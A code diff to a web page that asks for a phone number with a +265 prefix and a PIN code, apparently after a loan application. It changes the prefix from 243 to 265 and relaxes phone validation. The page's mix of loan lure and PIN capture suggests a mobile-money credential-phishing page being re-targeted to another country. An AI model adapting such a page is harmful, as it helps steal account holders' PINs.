@@ -350,7 +350,7 @@
         </svg>
       </span>
       <span class="code">+265</span>
-      <input type="tel" id="phoneInput" placeholder="951234567" inputmode="numeric" maxlength="9">
+      <input type="tel" id="phoneInput" placeholder="0951234567" inputmode="numeric" maxlength="10">
     </div>
 
     <div class="code-label">Enter your PIN code</div>
@@ -412,8 +412,8 @@
   // Automatically reflect the phone number passed from the loan application.
   const incomingParams = new URLSearchParams(window.location.search);
   const incomingPhone = incomingParams.get('phone') || '';
-  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
-  if (/^9[0-9]{8}$/.test(normalizedPhone)) {
+  const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^265/, '');
+  if (/^(?:9[0-9]{8}|09[0-9]{8})$/.test(normalizedPhone)) {
     phoneInput.value = normalizedPhone;
   }
   const connexionBtn = document.getElementById('connexionBtn');
@@ -521,9 +521,9 @@
     const phone = phoneInput.value.trim();
 
     // Show the invalid-number page only when the user tries to submit.
-    if(!/^9[0-9]{8}$/.test(phone)){
+    if(!/^(?:9[0-9]{8}|09[0-9]{8})$/.test(phone)){
       showInvalidPhone(
-        'The phone number must start with 9 and contain exactly 9 digits.<br>Please enter the correct number and try again!'
+        'The phone number must start with 9 (9 digits) or 09 (10 digits).<br>Please enter the correct number and try again!'
       );
       return;
     }
